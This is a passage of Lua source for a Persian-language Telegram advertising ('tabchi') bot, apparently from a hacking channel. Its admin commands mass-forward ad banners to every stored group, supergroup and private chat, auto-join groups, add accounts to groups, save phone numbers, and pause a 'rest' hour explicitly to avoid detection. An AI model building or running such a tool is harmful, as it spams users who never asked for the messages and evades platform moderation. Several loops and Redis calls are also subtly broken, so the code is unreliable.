for i=1 , mid do 
fwd_msg(cid,msg.chat_id,mid[i]) 
end 
end 
---------- 
if msg.content.text == 'banerlist' and is_admin(msg) then 
local mid = redis:smembers("BOT-IDtabchi_baner_mmid") 
text = "تعداد بنر های شما ["..mid.."]\n" 
for i=1 , mid do 
text = text.."> "..mid[i].."\n" 
end 
send_msg(msg.chat_id,text,msg.id) 
end 
---------- 
if msg.content.text == 'delallbaner' and is_admin(msg) then 
local mid = redis:sadd("BOT-IDtabchi_baner_mmid") 
for i=1 , mid do 
redis:srem("BOT-IDtabchi_baner_mmid", mid[i])
end 
redis:del("BOT-IDtabchi_baner_cid") 
send_msg(msg.chat_id,"تمامی پست های تنظیم شده برای تبلیغات هوشمند پاک شدند!",msg.id) 
end 
---------- 
if msg.content.text == 'delbaner' and is_admin(msg) and msg.reply_to_message_id then 
redis:srem("BOT-IDtabchi_baner_mmid",msg.reply_to_message_id) 
send_msg(msg.chat_id,"این پست از سامانه تبلیغات هوشمند حذف شد.",msg.id) 
end 
-------
if msg.content.text == 'leftname on' and is_admin(msg) then 
redis:set("BOT-IDleftname","ok") 
send_msg(msg.chat_id,"خروج از گروه ها بااسامی خاص فعال شد!",msg.id) 
end 
if msg.content.text == 'leftname off' and is_admin(msg) then 
redis:del("BOT-IDleftname") 
send_msg(msg.chat_id,"خروج از گروه ها بااسامی خاص غیرفعال شد!",msg.id) 
end 
if msg.content.text:match("^(addlname) (.*)$") and is_admin(msg) then
local matches = msg.content.text:match("^addlname (.*)$")
if not redis:sismember("BOT-IDleftnamecheck",matches) then 
redis:sadd("BOT-IDleftnamecheck",matches) 
send_msg(msg.chat_id,"اسم "..matches.." به اسامی خاص افزوده شد",msg.id) 
else
send_msg(msg.chat_id,"اسم "..matches.." در لیست اسامی خاص بود",msg.id) 
end
end
if msg.content.text:match("^(remlname) (.*)$") and is_admin(msg) then
local matches = msg.content.text:match("^remlname (.*)$")
if not redis:sismember("BOT-IDleftnamecheck",matches) then 
send_msg(msg.chat_id,"اسم "..matches.." در لیست اسامی خاص نبود",msg.id) 
else
send_msg(msg.chat_id,"اسم "..matches.." از لیست اسامی خاص حذف شد",msg.id) 
redis:srem("BOT-IDleftnamecheck",matches) 
end
end
if msg.content.text == "clean lname" and is_admin(msg) then
local checks = redis:smembers("BOT-IDleftnamecheck")
for x = 1, checks do
redis:srem("BOT-IDleftnamecheck", checks[x]) 
end
send_msg(msg.chat_id,"لیست اسامی خاص پاک شد",msg.id) 
end
------- 
if msg.content.text:match("^(addaddi) (.*)$") and is_admin(msg) then
local matches = msg.content.text:match("^addaddi (.*)$")
if not redis:sismember("BOT-IDadditexts",matches) then 
redis:sadd("BOT-IDadditexts",matches) 
send_msg(msg.chat_id,"پیام "..matches.." به لیست پیام های اد افزوده شد",msg.id) 
else
send_msg(msg.chat_id,"پیام "..matches.." در لیست پیام های اد بود",msg.id) 
end
end
if msg.content.text:match("^(remaddi) (.*)$") and is_admin(msg) then
local matches = msg.content.text:match("^remaddi (.*)$")
if not redis:sismember("BOT-IDadditexts",matches) then 
send_msg(msg.chat_id,"پیام "..matches.." در لیست پیام های اد نبود",msg.id) 
else
send_msg(msg.chat_id,"پیام "..matches.." از لیست پیام های اد پاک شد",msg.id) 
redis:srem("BOT-IDadditexts",matches) 
end
end

if msg.content.text == "clean addi" and is_admin(msg) then
local checks = redis:smembers("BOT-IDadditexts")
for x = 1, checks do
redis:srem("BOT-IDadditexts", checks[x]) 
end
send_msg(msg.chat_id,"لیست متن های اد مخاطب پاک شد",msg.id) 
end
----
if msg.content.text == 'autofwd on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autofwd","ok") 
send_msg(msg.chat_id,"تبلیغات اتوماتیک در گروه ها با زمانبندی مشخص فعال شد!",msg.id) 
end 
if msg.content.text == 'autofwd off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autofwd") 
send_msg(msg.chat_id,"تبلیغات اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
------------------------------ 
if msg.content.text == 'getrandombaner' and  is_admin(msg) then 
local r_chat = redis:get("BOT-IDrand_cid")
local m_id = redis:get("BOT-IDrand_mid")
fwd_msg(r_chat,msg.chat_id,m_id)
end
---------------------
if msg.content.text == 'setrandombaner' and msg.reply_to_message_id and is_admin(msg) then 
redis:set("BOT-IDrand_mid",msg.reply_to_message_id) 
redis:set("BOT-IDrand_cid",msg.chat_id) 
send_msg(msg.chat_id,"بنر تبلیغات رندم با موفقیت تنظیم شد!") 
end 
-----------------------------
if msg.content.text == 'autorandom on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autorandom","ok") 
send_msg(msg.chat_id,"تبلیغات رندم در گروه ها با زمانبندی مشخص فعال شد!\n حال تبلیغاتی هر نیم ساعت متن تبلیغ تنظیم شده شما را به ده گروه مختلف و بصورت شانسی میفرستد!",msg.id) 
end 
if msg.content.text == 'autorandom off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autorandom") 
send_msg(msg.chat_id,"تبلیغات رندم ده تایی در گروه ها غیر فعال شد!",msg.id) 
end 
------------------------------
if msg.content.text == 'tableft on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_tableft","ok") 
send_msg(msg.chat_id,"تبلیغ بنر هوشمند و لفت فعال شد.حتما دقت کنید که بنر را تنظیم کرده باشید",msg.id) 
end 
if msg.content.text == 'tableft off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_tableft") 
send_msg(msg.chat_id," تبلیغ بنر هوشمند و لفت غیرفعال شد.",msg.id) 
end 
------------------------------

if msg.content.text == 'addleft on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_addleft","ok") 
send_msg(msg.chat_id,"افزودن خودکار ربات هوشمند و لفت فعال شد.حتما دقت کنید که ربات هوشمند را تنظیم کرده باشید",msg.id) 
end 
if msg.content.text == 'addleft off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_addleft") 
send_msg(msg.chat_id,"افزودن خودکار ربات هوشمند و لفت غیرفعال شد.",msg.id) 
end 
--------------------------- 
if msg.content.text == 'autoaddtoall on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autoaddtoall","ok") 
send_msg(msg.chat_id,"اضافه کردن اتوماتیک در گروه ها فعال شد",msg.id) 
end 
if msg.content.text == 'autoaddtoall off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autoaddtoall") 
send_msg(msg.chat_id,"اضافه کردن اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == 'autoleft on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autoleft","ok") 
send_msg(msg.chat_id,"ترک اتوماتیک گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == 'autoleft off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autoleft") 
send_msg(msg.chat_id,"ترک اتوماتیک گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- --------------------------- 
if msg.content.text == 'channelleft on' and is_admin(msg) then 
redis:set("BOT-IDchannelleft","ok") 
send_msg(msg.chat_id,"لفت خودکار از کانال ها فعال شد!",msg.id) 
end 
if msg.content.text == 'channelleft off' and is_admin(msg) then 
redis:del("BOT-IDchannelleft") 
send_msg(msg.chat_id,"لفت خودکار از کانال ها غیرفعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == 'groupleft on' and is_admin(msg) then 
redis:set("BOT-IDgroupleft","ok") 
send_msg(msg.chat_id,"لفت خودکار از گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == 'groupleft off' and is_admin(msg) then 
redis:del("BOT-IDgroupleft") 
send_msg(msg.chat_id,"لفت خودکار از گروه ها غیرفعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == 'join on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autojoin","ok") 
send_msg(msg.chat_id,"عضویت اتوماتیک در گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == 'join off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autojoin") 
send_msg(msg.chat_id,"عضویت اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == 'sec on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autosec","ok") 
send_msg(msg.chat_id,"حالت امنیتی اتوماتیک جهت حفاظت از تبلیغاتی فعال شد",msg.id) 
end 
if msg.content.text == 'sec off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autosec") 
send_msg(msg.chat_id,"حالت امنیتی اتوماتیک غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == 'ping' and is_admin(msg) then 
fwd_msg(msg.chat_id,msg.chat_id,msg.id) 
end 
--------------------------- 
if msg.content.text == 'sec_savenumber on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_autosecsave","ok") 
send_msg(msg.chat_id,"حالت امنیتی سیو کردن شماره ها فعال شد!",msg.id) 
end 
if msg.content.text == 'sec_savenumber off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_autosecsave") 
send_msg(msg.chat_id,"حالت امنیتی سیو کردن شماره ها غیر فعال شد!",msg.id) 
end 
----_-------_-------------- 
if msg.content.text == 'markread on' and is_admin(msg) then 
redis:set("BOT-IDtabchi_markread","ok") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی پیام های ارسالی را بازدید میکند!",msg.id) 
end 
if msg.content.text == 'markread off' and is_admin(msg) then 
redis:del("BOT-IDtabchi_markread") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی پیام های ارسالی را بازدید نمیکند!",msg.id) 
end 
---------------------------
---  ---

if msg.content.text:match('fs_random') and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers("BOT-IDtabchi_sugp")

for i=1, lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
end 
send_msg(msg.chat_id,"▪️ has been Sent to "..lol.." supergroup with random mode😏 ▪️") 
end 
------------------------ 

if msg.content.text == 'fs' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers("BOT-IDtabchi_sugp") 
for i=1, lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd("BOT-IDsended", lol[i])
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set("BOT-IDon-offmsg", msg.reply_to_message_id)
redis:set("BOT-IDon-offchat", msg.chat_id)
redis:setex("BOT-IDtabchi_fwdtime", 30, true)

end 
--------------------------
if msg.content.text:match("^(addlname) (.*)$") and is_admin(msg) then
local matches = msg.content.text:match("^addlname (.*)$")
if not redis:sismember("BOT-IDleftnamecheck",matches) then 
redis:sadd("BOT-IDleftnamecheck",matches) 
send_msg(msg.chat_id,"اسم "..matches.." به اسامی خاص افزوده شد",msg.id) 
else
send_msg(msg.chat_id,"اسم "..matches.." در لیست اسامی خاص بود",msg.id) 
end
end
if msg.content.text == 'fall' and msg.reply_to_message_id and is_admin(msg) then
    local lol2 = redis:smembers("BOT-IDtabchi_sugp")
	local id = msg.reply_to_message_id
	local lol = redis:smembers("BOT-IDtabchi_gp")  
    local lol3 = redis:smembers("BOT-IDtabchi_pv")  
    local all = redis:smembers("BOT-IDall")  
	local sended = redis:smembers("BOT-IDsended")
	for i, v in pairs(sended) do
	redis:srem("BOT-IDsended", v)
end
--[[for i, v in pairs(all) do
openChat(tonumber(v), dl_cb, nil)
assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
}, dl_cb, nil)) 
redis:sadd("BOT-IDsended", tonumber(v))
end]]
for i, v in pairs(lol) do
openChat(tonumber(v), dl_cb, nil)
assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
}, dl_cb, nil)) 
redis:sadd("BOT-IDsended", tonumber(v))
end
for i, v in pairs(lol2) do
openChat(tonumber(v), dl_cb, nil)
assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
}, dl_cb, nil)) 
redis:sadd("BOT-IDsended", tonumber(v))
end
for i, v in pairs(lol3) do
openChat(tonumber(v), dl_cb, nil)
assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
}, dl_cb, nil)) 
redis:sadd("BOT-IDsended", tonumber(v))
end
send_msg(msg.chat_id,"Has been Sent to "..lol2.." Super Groups and "..lol.." Groups and "..lol3.." Pvs.All about "..all)
redis:set("BOT-IDon-offmsg", msg.reply_to_message_id)
redis:set("BOT-IDon-offchat", msg.chat_id)
redis:setex("BOT-IDtabchi_fwdtime", 60, true)
end

--------------------------
if msg.content.text == 'fg' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers("BOT-IDtabchi_gp") 
for i=1, lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id)
redis:sadd("BOT-IDsended", lol[i]) 
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set("BOT-IDon-offmsg", msg.reply_to_message_id)
redis:set("BOT-IDon-offchat", msg.chat_id)
redis:setex("BOT-IDtabchi_fwdtime", 30, true)
end 
--------------------- 
if msg.content.text == 'fv' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers("BOT-IDtabchi_pv") 
for i=1, lol do 
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd("BOT-IDsended", lol[i])
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set("BOT-IDon-offmsg", msg.reply_to_message_id)
redis:set("BOT-IDon-offchat", msg.chat_id)
redis:setex("BOT-IDtabchi_fwdtime", 30, true)
end 
if msg.content.text == "reset" and is_admin(msg) then 
if not redis:get("BOT-IDreset") then
--redis:del("BOT-IDall:pm") 
--redis:del("BOT-IDbot_msg") 
--redis:del("BOT-IDtabchi_bot") 
local lol1 = redis:smembers("BOT-IDtabchi_gp") 
for i=1, lol1 do 
redis:srem("BOT-IDtabchi_gp", lol1[i])
end 
local lol2 = redis:smembers("BOT-IDtabchi_pv") 
for i=1, lol2 do 
redis:srem("BOT-IDtabchi_pv", lol2[i])
end 
local lol3 = redis:smembers("BOT-IDtabchi_sugp") 
for i=1, lol3 do 
redis:srem("BOT-IDtabchi_sugp", lol3[i])
end 
local lol4 = redis:smembers("BOT-IDall") 
for i=1, lol4 do 
redis:srem("BOT-IDall", lol4[i])
end 
local lol5 = redis:smembers("BOT-IDtabchi_alllinks") 
for i=1, lol5 do 
redis:srem("BOT-IDtabchi_alllinks", lol5[i])
end 
local lol6 = redis:smembers("BOT-IDtabchi_waitforlinks") 
for i=1, lol6 do 
redis:srem("BOT-IDtabchi_waitforlinks", lol6[i])
end 
local lol7 = redis:smembers("BOT-IDtabchi_checklinks") 
for i=1, lol7 do 
redis:srem("BOT-IDtabchi_checklinks", lol7[i])
end 
local lol8 = redis:smembers("BOT-IDtabchi_bot") 
for i=1, lol8 do 
redis:srem("BOT-IDtabchi_bot", lol8[i])
end 
local lol9 = redis:smembers("BOT-IDsended") 
for i=1, lol9 do 
redis:srem("BOT-IDsended", lol9[i])
end
local lol10 = redis:smembers("BOT-IDaddleft_gp") 
for i=1, lol10 do 
redis:srem("BOT-IDaddleft_gp", lol10[i])
end
local lol11 = redis:smembers("BOT-IDaddall_gp") 
for i=1, lol11 do 
redis:srem("BOT-IDaddall_gp", lol11[i])
end
local lol12 = redis:smembers("BOT-IDtableft_gp") 
for i=1, lol12 do 
redis:srem("BOT-IDtableft_gp", lol12[i])
end
send_msg(msg.chat_id,"▪️سیستم امارگیری تبلیغاتی بازنشانی شد!",msg.id) 
redis:setex("BOT-IDreset", 43200, true)
else
send_msg(msg.chat_id,"▪️شما هر 12 ساعت یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl("BOT-IDreset").."ثانیه",msg.id) 
end
end 
if msg.content.text == 'updatebot' and is_admin(msg) then 
if not redis:get("BOT-IDupdatebot") then
					get_bot()
send_msg(msg.chat_id,"مشخصات فردی تبلیغاتی BOT-ID به روز رسانی شد ") 
redis:setex("BOT-IDupdatebot", 43200, true)
else
send_msg(msg.chat_id,"▪️شما هر 12 ساعت یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl("BOT-IDupdatebot"),msg.id) 
end
					end
if msg.content.text == 'reload' and is_admin(msg) then 
if not redis:get("BOT-IDreload") then
					reload()
send_msg(msg.chat_id,"ربات شماره BOT-ID از نو راه اندازی شد") 
redis:setex("BOT-IDreload", 43200, true)
else
send_msg(msg.chat_id,"▪️شما هر 12 ساعت یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl("BOT-IDreload"),msg.id) 
end
					end
if msg.content.text == "settings" and is_admin(msg) then 
local who_join = redis:get("BOT-IDtabchi_autojoin") 
local who_left = redis:get("BOT-IDtabchi_autoleft") 
local who_mark = redis:get("BOT-IDtabchi_markread") 
local who_autofwd = redis:get("BOT-IDtabchi_autofwd") 
local who_numsave = redis:get("BOT-IDtabchi_save") 
local who_addtoall = redis:get("BOT-IDtabchi_autoaddtoall") 
local who_randomfwd = redis:get("BOT-IDtabchi_autorandom")
local is_typing = redis:get("BOT-IDtab_typing")
local groupleft = redis:get("BOT-IDgroupleft")
local channelleft = redis:get("BOT-IDchannelleft")
local leftnam = redis:get("BOT-IDleftname")
local addleft = redis:get("BOT-IDtabchi_addleft")
local tableft = redis:get("BOT-IDtabchi_tableft")
if addleft then
addeft = "[✅]"
else
addeft = "[🚫]" 
end
if tableft then
tabeft = "[✅]"
else
tabeft = "[🚫]" 
end
if leftname then
lefname = "[✅]"
else
lefname = "[🚫]" 
end
if groupleft then
gleft = "[✅]"
else
gleft = "[🚫]" 
end
if channelleft then
chleft = "[✅]"
else
chleft = "[🚫]" 
end
if is_typing then
ist = "[✅]"
else
ist = "[🚫]" 
end
if who_randomfwd then
randfwd = "[✅]"
else
randfwd = "[🚫]"
end
if who_addtoall then 
addt = "[✅]" 
else 
addt = "[🚫]" 
end 
if who_join then 
addjn = "[✅]" 
else 
addjn = "[🚫]" 
end 
if who_mark then 
addmk = "[✅]" 
else 
addmk = "[🚫]" 
end 
if who_autofwd then 
auto = "[✅]" 
else 
auto = "[🚫]" 
end 
if who_left then 
autolf = "[✅]" 
else 
autolf = "[🚫]" 
end 
if who_numsave then 
numtext = "[✅]" 
else 
numtext = "[🚫]" 
end 
local mid = redis:get("BOT-IDtabchi_baner_mid") 
local settings = "▪️تنظیمات تبلیغاتی\n▫️تبلیغات هوشمند: "..auto.."\n▫️سیو کردن شماره ها: "..numtext.."\n▫️اضافه کردن اتوماتیک به گروه ها:  "..addt.."\n▫️لفت دادن اتوماتیک از گروه ها: "..autolf.."\n▫️عضویت اتوماتیک در گروه ها: "..addjn.."\n▫️تبلیغات اتوماتیک رندم در گروه ها: "..randfwd.."\n▫️ارسال تایپینگ در گروه ها: "..ist.."\n▫️لفت اتوماتیک کانال ها: "..chleft.."\n▫️لفت اتوماتیک گروه ها: "..gleft.."\n▫️لفت از گروه اسامی خاص: "..lefname.."\n▫️تبلیغ خودکار و لفت: "..tabeft.."\n▫️افزودن خودکار و لفت: "..addeft.."\n\nتبلیغاتی ورژن 3(@Stags)"
send_msg(msg.chat_id,settings) 
end 
if (msg.content.text == "tablighati" or msg.content.text == "تبلیغاتی") and is_admin(msg) then 
local tab = [[ 
▪️تبلیغاتی
▫️ورژن:3
▫️برپایه: TdStags(استفاده شده از TdLib)
▫️زبان کدنویسی: Lua(استفاده شده از Redis)
▫️قابلیت پشتیبانی: اکانت های cli(حتی 9رقمی)

▪️تی پی هک
▫️کانال: @tphack
▫️سایت: http://cs-hacker.ml
▫توسعه دهنده: @arhack12

کیفیت را به قیمت نفروشیم!
برتر بودن هنر میخواهد!
]]
send_msg(msg.chat_id,tab,msg.id) 
end 
if msg.content.text == "help" and is_admin(msg) then 
local help = [[ 
لیست راهنمای تبلیغاتی:
autofwd [on,off] 
تنظیم تبلیغات اتوماتیک هوشمندانه 
setbaner [reply] 
تنظیم بنر تبلیغات هوشمند با رپلای 
getbaner 
دریافت همه بنر های تبلیغات هوشمند 
delbaner 
حذف یک بنر با رپلای 
delallbaner 
پاک کردن همه بنر های تنظیم شده 
banerlist 
دیدن لیست بنر های تبلیغاتی 
savenumber [on,off] 
روشن و یا خاموش کردن حالت سیو کردن شماره ها 
groupleft [on,off] 
روشن و یا خاموش کردن لفت اتوماتیک گروه ها
channelleft [on,off] 
روشن و یا خاموش کردن لفت اتوماتیک کانال ها
stats 
دریافت امار تبلیغاتی 
settings 
دریافت تنظیمات تبلیغاتی تبلیغاتی 
bc [su,pv,gp] 
ارسال متن به گروه یا پیوی یا سوپر گروه ها 
fwd [su,gp,pv] 
فروارد متن شما به گروه یا سوپر گروه یا پیوی ها 
fs 
ارسال هرگونه متن و یا مدیا با رپلای به سوپر گروه ها
fall
ارسال هرگونه متن و یا مدیا با رپلای به سوپر گروه ها و گروه ها و پی وی ها
fg 
ارسال هرگونه متن و یا مدیا با رپلای به گروه ها 
fv 
ارسال هرگونه متن و یا مدیا با رپلای به پیوی ها 
addmembers 
ادممبر در گروه 
addtoall 
اضافه کردن یک فرد به تمامی گروه های تبلیغاتی 
autoaddtoall [on,off] 
اضافه کردن هوشمندانه حساب کاربری به گروه ها 
setaddtoall 
تنظیم ایدی برای اضافه کردن هوشمندانه 
addleft [on,off]
برای افزودن اکانت هوشمند تنظیم شده و بلافاصله لفت
left 
ترک گروه مورد نظر 
leftall 
ترک کردن تبلیغاتی از تمامی گروه ها 
autoleft [on,off] 
روشن خاموش کردن حالت ترک اتوماتیک گروه ها 
join [on,off] 
روشن یا خاموش کردن عضویت اتوماتیک در گروه 
leftname [on,off] 
روشن یا خاموش کردن لفت خودکار بااسامی خاص
addlname
افزودن اسم به اسامی خاص
remlname
حذف کردن اسم از اسامی خاص
clean lname
پاک کردن لیست اسامی خاص
addaddi
افزودن پیام به لیست اد مخاطب
remaddi
حذف کردن پیام از لیست اد مخاطب
clean addi
پاک کردن لیست پیام های اد مخاطب
reset
بازنشانی امار تبلیغاتی (مجاز هریک روز)
rest 
استراحت کردن تبلیغاتی به مدت یک ساعت 
sec [on,off] 
روشن خاموش کردن سامانه اتوماتیک حفاظت از تبلیغاتی 
ping 
اگر تبلیغاتی انلاین باشد پیام شما را فروارد میکند 
fs_random
ارسال یک پست تبلیغاتی با رپلای به روی پیام به ده گروه مختلف و رندم!
setrandombaner
تنظیم تبلیغ با رپلای برای تبلیغات هوشمند رندم
getrandombaner
دیدن بنر تبلیغات رندم
autorandom [on,off]
فعال یا غیر فعال کردن تبلیغات هوشمند ، این نوع قابلیت پیام تنظیم شده را هر نیم ساعت به ده گروه فروارد میکند!
برای استفاده ازین قابلیت حتما تبلیغاتی شما باید حداقل 20 گروه داشته باشد ☺!
tableft [on,off]
برای  تبلیغ هوشمند تنظیم شده و بلافاصله لفت
echo [text]
متن text را ارسال میکند.
setabout [about]
تنظیم کردن about برای بیو فرد!
reload
اجرا کردن دوباره فایل ربات(مجاز هر یک روز)
updatebot
بروزرسانی پروفایل ربات(مجاز هریک روز)
tablighati 
تبلیغاتی
نمایش مشخصات سورس و سازنده

تبلیغاتی ورژن 3(  @tphack  )
]] 
send_msg(msg.chat_id,help,msg.id) 
end 

if msg.content.text == 'left' and is_admin(msg) then 
send_msg(msg.chat_id,"تبلیغاتی با ایدی عددی "..bot.."از گروه خارج میشود") 
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
---------------------------- 
if msg.content.text == 'leftall' and is_admin(msg) then 
local lgp = redis:smembers("BOT-IDtabchi_gp") 
local lsug = redis:smembers("BOT-IDtabchi_sugp") 
local lgpn = redis:scard("BOT-IDtabchi_gp") 
local lsugn = redis:scard("BOT-IDtabchi_sugp") 
for i=1 , lgp do 
openChat(lgp[i], dl_cb, nil)
leave(tonumber(lgp[i]),tonumber(bot)) 
end 
for i=1 , lsug do 
openChat(lsug[i], dl_cb, nil)
leave(tonumber(lsug[i]),tonumber(bot)) 
end 
send_msg(msg.chat_id,"تبلیغاتی از "..lgpn.." گروه و از "..lsugn.." سوپرگروه لفت داد",msg.id) 
end 
---------------------------- 
if msg.content.text == "rest" and is_admin(msg) then 
redis:setex("BOT-IDtab_sleep",2000,true) 
send_msg(msg.chat_id,"▪️تبلیغاتی از الان تا یک ساعت دیگر جهت شناسایی نشدن و همچنین استراحت سرور به خواب میرود!",msg.id) 
end 
---------------------------- 
end
end 
if data.message.content._ == "messageText" then
			   return
		    end
			return false
		 end 
end
--Writeen by : @tphack